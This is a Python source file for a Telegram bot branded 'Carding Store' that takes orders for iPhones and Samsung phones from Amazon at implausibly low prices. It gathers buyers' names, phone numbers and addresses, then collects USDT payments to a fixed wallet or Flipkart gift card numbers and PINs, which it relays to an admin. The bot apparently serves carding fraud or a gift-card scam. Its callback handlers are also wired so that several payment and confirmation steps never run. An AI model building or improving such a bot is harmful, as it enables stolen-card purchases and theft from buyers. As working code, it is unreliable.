import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pymongo import MongoClient
import re

# -----------------------
# CONFIG
# -----------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
MONGO_URL = os.getenv("MONGO_URL")

# USDT TRC20 address
USDT_ADDRESS = "THbHaBRV6hJQ5A3dsrqm4tPfTzLBthnwbk"
USDT_RATE = 85  # 1 USDT = 85 INR

# PRICE MAP
PRICE_MAP = {
    "iPhone 15 Pro": {"128GB": 2100, "256GB": 2500},
    "iPhone 15 Pro Max": {"256GB": 2700, "512GB": 3000},
    "iPhone 16 Pro": {"128GB": 2300, "256GB": 2600},
    "iPhone 16 Pro Max": {"256GB": 2800, "512GB": 3200},
    "Samsung Galaxy S24 Ultra": {"256GB": 1800, "512GB": 2000},
    "Samsung Galaxy S25 Ultra": {"256GB": 2200, "512GB": 2500}
}

bot = telebot.TeleBot(BOT_TOKEN)

# -----------------------
# MONGO DB SETUP
# -----------------------
client = MongoClient(MONGO_URL)
db = client['usa_bot']
users_col = db['users']

# -----------------------
# TEMP STORAGE
# -----------------------
pending_messages = {}
active_chats = {}
user_stage = {}

# -----------------------
# START COMMAND
# -----------------------
@bot.message_handler(commands=['start'])
def start(msg):
    user_id = msg.from_user.id
    users_col.update_one({'user_id': user_id}, {'$set': {'user_id': user_id}}, upsert=True)
    user_stage[user_id] = "start"

    kb = InlineKeyboardMarkup()  
    kb.add(InlineKeyboardButton("💳 BUY", callback_data="buy"))  
    bot.send_message(msg.chat.id, "👋 Welcome to Carding Store\n👉 iPhone / Samsung Devices Buy Here", reply_markup=kb)

# -----------------------
# CALLBACK HANDLER
# -----------------------
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    user_id = call.from_user.id
    data = call.data

    if data == "buy":  
        user_stage[user_id] = "choose_platform"  
        kb = InlineKeyboardMarkup()  
        kb.add(InlineKeyboardButton("🛒 Amazon", callback_data="platform_amazon"))  
        kb.add(InlineKeyboardButton("🚧 Coming Soon", callback_data="platform_coming"))  
        bot.edit_message_text("Choose your platform:", call.message.chat.id, call.message.message_id, reply_markup=kb)  
        return  

    if data.startswith("platform_") and user_stage.get(user_id) == "choose_platform":  
        if data == "platform_amazon":  
            user_stage[user_id] = "service"  
            kb = InlineKeyboardMarkup()  
            kb.add(InlineKeyboardButton("iPhone 16 Pro", callback_data="buy_iphone16pro"))  
            kb.add(InlineKeyboardButton("iPhone 15 Pro", callback_data="buy_iphone15pro"))  
            kb.add(InlineKeyboardButton("iPhone 16 Pro Max", callback_data="buy_iphone16promax"))  
            kb.add(InlineKeyboardButton("iPhone 15 Pro Max", callback_data="buy_iphone15promax"))  
            kb.add(InlineKeyboardButton("Samsung Galaxy S24 Ultra", callback_data="buy_s24ultra"))  
            kb.add(InlineKeyboardButton("Samsung Galaxy S25 Ultra", callback_data="buy_s25ultra"))  
            bot.edit_message_text("Choose your device:", call.message.chat.id, call.message.message_id, reply_markup=kb)  
            return  
        elif data == "platform_coming":  
            bot.edit_message_text("🚧 This feature is coming soon…", call.message.chat.id, call.message.message_id)  
            return  

    if data.startswith("buy_") and user_stage.get(user_id) == "service":  
        service_map = {  
            "buy_iphone15pro": "iPhone 15 Pro",  
            "buy_iphone15promax": "iPhone 15 Pro Max",  
            "buy_iphone16pro": "iPhone 16 Pro",  
            "buy_iphone16promax": "iPhone 16 Pro Max",  
            "buy_s24ultra": "Samsung Galaxy S24 Ultra",  
            "buy_s25ultra": "Samsung Galaxy S25 Ultra"  
        }  
        service = service_map.get(data, "Device")  
        user_stage[user_id] = "choose_color"  
        pending_messages[user_id] = {'service': service}  

        kb = InlineKeyboardMarkup()  
        if "iPhone 16" in service:  
            kb.add(InlineKeyboardButton("Desert Titanium", callback_data=f"color|{service}|Desert Titanium"))  
            kb.add(InlineKeyboardButton("Natural Titanium", callback_data=f"color|{service}|Natural Titanium"))  
            kb.add(InlineKeyboardButton("White Titanium", callback_data=f"color|{service}|White Titanium"))  
            kb.add(InlineKeyboardButton("Black Titanium", callback_data=f"color|{service}|Black Titanium"))  
        elif "iPhone 15" in service:  
            kb.add(InlineKeyboardButton("Black", callback_data=f"color|{service}|Black"))  
            kb.add(InlineKeyboardButton("White", callback_data=f"color|{service}|White"))  
            kb.add(InlineKeyboardButton("Blue", callback_data=f"color|{service}|Blue"))  
        else:  
            kb.add(InlineKeyboardButton("Grey", callback_data=f"color|{service}|Grey"))  
            kb.add(InlineKeyboardButton("Black", callback_data=f"color|{service}|Black"))  

        bot.edit_message_text(f"Select color for {service}:", call.message.chat.id, call.message.message_id, reply_markup=kb)  
        return  

    if data.startswith("color|") and user_stage.get(user_id) in ("choose_color", "service"):  
        parts = data.split("|")  
        if len(parts) < 3:  
            bot.answer_callback_query(call.id, "Invalid selection.")  
            return  
        service = parts[1]  
        color = parts[2]  
        pending_messages.setdefault(user_id, {})['color'] = color  

        user_stage[user_id] = "choose_storage"  
        kb = InlineKeyboardMarkup()  
        if "Samsung" in service or "Pro Max" in service:  
            kb.add(InlineKeyboardButton("256GB", callback_data=f"storage|{service}|{color}|256GB"))  
            kb.add(InlineKeyboardButton("512GB", callback_data=f"storage|{service}|{color}|512GB"))  
        else:  
            kb.add(InlineKeyboardButton("128GB", callback_data=f"storage|{service}|{color}|128GB"))  
            kb.add(InlineKeyboardButton("256GB", callback_data=f"storage|{service}|{color}|256GB"))  
        bot.edit_message_text(f"Select storage for {service} ({color}):", call.message.chat.id, call.message.message_id, reply_markup=kb)  
        return  

    if data.startswith("storage|") and user_stage.get(user_id) == "choose_storage":  
        parts = data.split("|")  
        if len(parts) < 4:  
            bot.answer_callback_query(call.id, "Invalid selection.")  
            return  
        service, color, storage = parts[1], parts[2], parts[3]  
        pending_messages.setdefault(user_id, {})['service'] = f"{service} ({color}, {storage})"  

        price_inr = PRICE_MAP.get(service, {}).get(storage, 0)  
        price_usdt = round(price_inr / USDT_RATE, 2)  

        # --- ASK NAME ---  
        user_stage[user_id] = "ask_name"  
        bot.send_message(  
            user_id,  
            f"📦 Order Summary:\n\nDevice: {service}\nColour: {color}\nStorage: {storage}\n\n"  
            f"💰 Price: ₹{price_inr} (~{price_usdt} USDT)\n\n"  
            f"📋 Please enter your Name:"  
        )  
        return  

# -----------------------
# HANDLE NAME, MOBILE & ADDRESS
# -----------------------
@bot.message_handler(func=lambda m: user_stage.get(m.from_user.id) in ["ask_name", "ask_mobile", "ask_address"], content_types=['text'])
def handle_user_input(msg):
    user_id = msg.from_user.id
    stage = user_stage.get(user_id)
    
    if stage == "ask_name":  
        name = msg.text.strip()  
        if not name:  
            bot.send_message(user_id, "⚠️ Name cannot be empty. Please enter your Name:")  
            return  
        pending_messages.setdefault(user_id, {})['name'] = name  
        user_stage[user_id] = "ask_mobile"  
        bot.send_message(user_id, "📱 Please enter your 10-digit Mobile Number (digits only):")  
        return  

    if stage == "ask_mobile":  
        mobile = msg.text.strip()  
        if not re.fullmatch(r"\d{10}", mobile):  
            bot.send_message(user_id, "⚠️ Invalid number. Enter 10-digit Mobile Number:")  
            return  
        pending_messages.setdefault(user_id, {})['mobile'] = mobile  
        user_stage[user_id] = "ask_address"  
        bot.send_message(user_id, "🏠 Please enter your Address:")  
        return  

    if stage == "ask_address":
        address = msg.text.strip()
        if not address:
            bot.send_message(user_id, "⚠️ Address cannot be empty. Please enter your Address:")
            return
        pending_messages.setdefault(user_id, {})['address'] = address

        # SHOW ORDER SUMMARY WITH CONFIRM/EDIT
        service = pending_messages[user_id].get('service', 'Service')
        color = pending_messages[user_id].get('color', '')
        storage = ''
        if '(' in service and ',' in service:
            storage = service.split(',')[-1].replace(')','').strip()
        price_inr = PRICE_MAP.get(service.split('(')[0].strip(), {}).get(storage, 0)
        price_usdt = round(price_inr / USDT_RATE, 2)
        name = pending_messages[user_id].get('name', '')
        mobile = pending_messages[user_id].get('mobile', '')

        summary_text = (
            f"📦 Order Summary:\n\n"
            f"Device: {service}\n"
            f"Name: {name}\n"
            f"Mobile: {mobile}\n"
            f"Address: {address}\n"
            f"💰 Price: ₹{price_inr} (~{price_usdt} USDT)\n\n"
            f"✅ Confirm to proceed or ✏️ Edit your details"
        )

        kb = InlineKeyboardMarkup()
        kb.add(
            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_details|{user_id}"),
            InlineKeyboardButton("✏️ Edit", callback_data=f"edit_details|{user_id}")
        )

        bot.send_message(user_id, summary_text, reply_markup=kb)
        user_stage[user_id] = "confirm_address"

# -----------------------
# CONFIRM / EDIT CALLBACK
# -----------------------
@bot.callback_query_handler(func=lambda call: True)
def confirm_edit_callback(call):
    user_id = call.from_user.id
    data = call.data

    if data.startswith("confirm_details|"):
        # User confirmed address
        user_stage[user_id] = "choose_payment"
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("USDT TRC20", callback_data="pay_usdt"))
        kb.add(InlineKeyboardButton("Flipkart Gift Card", callback_data="pay_flipkart"))
        bot.edit_message_text("✅ Details confirmed. Select payment method:", call.message.chat.id, call.message.message_id, reply_markup=kb)
        return

    if data.startswith("edit_details|"):
        # User wants to edit details
        user_stage[user_id] = "ask_name"
        bot.edit_message_text("✏️ Please enter your Name again:", call.message.chat.id, call.message.message_id)
        return

# -----------------------
# PAYMENT CALLBACKS
# -----------------------
@bot.callback_query_handler(func=lambda call: True)
def payment_callback(call):
    user_id = call.from_user.id
    data = call.data

    if data == "pay_usdt" and user_stage.get(user_id) == "choose_payment":
        user_stage[user_id] = "waiting_payment"
        pending_messages.setdefault(user_id, {})['payment_type'] = "USDT"
        bot.send_message(
            user_id,
            f"💰 Send USDT (TRC20) to this address (nano-copy):\n\n{USDT_ADDRESS}\n\n"
            "After payment, send the screenshot of your transfer here as proof."
        )
        return

    if data == "pay_flipkart" and user_stage.get(user_id) == "choose_payment":
        user_stage[user_id] = "flipkart_card"
        pending_messages.setdefault(user_id, {})['payment_type'] = "Flipkart Gift Card"
        bot.send_message(user_id, "🎁 Enter your Flipkart Gift Card number:")
        return

# -----------------------
# HANDLE PAYMENT / SCREENSHOT / FLIPKART
# -----------------------
@bot.message_handler(func=lambda m: True, content_types=['text','photo'])
def chat_handler(msg):
    user_id = msg.from_user.id
    stage = user_stage.get(user_id, "none")
    pending_messages.setdefault(user_id, {})

    if user_id == ADMIN_ID:
        for uid, active in active_chats.items():
            if active:
                bot.send_message(uid, f"🤖Bot: {msg.text if msg.content_type=='text' else '📸 Screenshot sent'}")
        return

    if user_id in active_chats and active_chats[user_id]:
        bot.send_message(ADMIN_ID, f"💬 User {user_id}: {msg.text if msg.content_type=='text' else '📸 Screenshot sent'}")
        return

    # --- FLIPKART PAYMENT ---
    if stage == "flipkart_card":
        text = msg.text.strip()
        tokens = [t for t in text.replace("\n", " ").split(" ") if t]
        if len(tokens) >= 2:
            pending_messages[user_id]['flipkart_card'] = tokens[0]
            pending_messages[user_id]['flipkart_pin'] = tokens[1]
        else:
            pending_messages[user_id]['flipkart_card'] = tokens[0]
            user_stage[user_id] = "flipkart_pin"
            bot.send_message(user_id, "🎁 Now enter your Flipkart Gift Card PIN:")
            return

        user_stage[user_id] = "done"
        admin_text = (
            f"💰 Flipkart Payment Request\n"
            f"Name: <a href='tg://user?id={user_id}'>{pending_messages[user_id].get('name','')}</a>\n"
            f"User ID: {user_id}\n"
            f"Service: {pending_messages[user_id].get('service','Service')}\n"
            f"Address: {pending_messages[user_id].get('address','')}\n"
            f"Payment Method: Flipkart Gift Card\n\n"
            f"Card Number: {pending_messages[user_id]['flipkart_card']}\n"
            f"PIN: {pending_messages[user_id].get('flipkart_pin','')}"
        )
        kb = InlineKeyboardMarkup()
        kb.add(
            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}")
        )
        bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=kb)
        return

    if stage == "flipkart_pin":
        pending_messages[user_id]['flipkart_pin'] = msg.text.strip()
        user_stage[user_id] = "done"
        admin_text = (
            f"💰 Flipkart Payment Request\n"
            f"Name: <a href='tg://user?id={user_id}'>{pending_messages[user_id].get('name','')}</a>\n"
            f"User ID: {user_id}\n"
            f"Service: {pending_messages[user_id].get('service','Service')}\n"
            f"Address: {pending_messages[user_id].get('address','')}\n"
            f"Payment Method: Flipkart Gift Card\n\n"
            f"Card Number: {pending_messages[user_id]['flipkart_card']}\n"
            f"PIN: {pending_messages[user_id]['flipkart_pin']}"
        )
        kb = InlineKeyboardMarkup()
        kb.add(
            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}")
        )
        bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=kb)
        return

    # --- USDT PAYMENT ---
    if stage == "waiting_payment":
        payment_type = pending_messages[user_id].get('payment_type', '')
        if payment_type == "USDT":
            if msg.content_type != 'photo':
                bot.send_message(user_id, "⚠️ Please send the screenshot (photo) of your USDT transfer as payment proof.")
                return
            pending_messages[user_id]['screenshot'] = msg.photo[-1].file_id
            user_stage[user_id] = "done"
            admin_text = (
                f"💰 USDT Payment Request\n"
                f"Name: <a href='tg://user?id={user_id}'>{pending_messages[user_id].get('name','')}</a>\n"
                f"User ID: {user_id}\n"
                f"Service: {pending_messages[user_id].get('service','Service')}\n"
                f"Address: {pending_messages[user_id].get('address','')}\n"
                f"Payment Method: USDT (TRC20)\n"
                f"USDT Address: {USDT_ADDRESS}\n"
            )
            kb = InlineKeyboardMarkup()
            kb.add(
                InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
                InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}")
            )
            bot.send_photo(
                ADMIN_ID,
                pending_messages[user_id]['screenshot'],
                caption=admin_text,
                parse_mode="HTML",
                reply_markup=kb
            )
            return

    bot.send_message(user_id, "⚠️ Please follow the steps or use /start to begin.")

# -----------------------
# ADMIN CONFIRM / CANCEL
# -----------------------
@bot.callback_query_handler(func=lambda call: call.data.startswith(("confirm","cancel")))
def admin_confirm_cancel(call):
    parts = call.data.split("|")
    action = parts[0]
    if len(parts) < 2:
        bot.answer_callback_query(call.id, "Invalid admin action.")
        return
    try:
        target_id = int(parts[1])
    except:
        bot.answer_callback_query(call.id, "Invalid user id.")
        return

    if target_id not in pending_messages:
        bot.send_message(ADMIN_ID, "⚠️ No pending request from this user.")
        return

    info = pending_messages.pop(target_id)
    service = info.get('service', 'Service')

    if action == "confirm":
        bot.send_message(target_id, f"✅ Your payment is successful! Please wait 5-10 minutes, your order ({service}) is placed.")
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💬 Chat with User", callback_data=f"chat|{target_id}"))
        bot.send_message(ADMIN_ID, f"Payment confirmed for user {target_id}.", reply_markup=kb)
    else:
        bot.send_message(target_id, "❌ Your payment was not received and your order is cancelled.")
        bot.send_message(ADMIN_ID, f"❌ Payment cancelled for user {target_id}.")
    user_stage[target_id] = "done"

# -----------------------
# RUN BOT
# -----------------------
print("✅ Bot running…")
bot.infinity_polling()
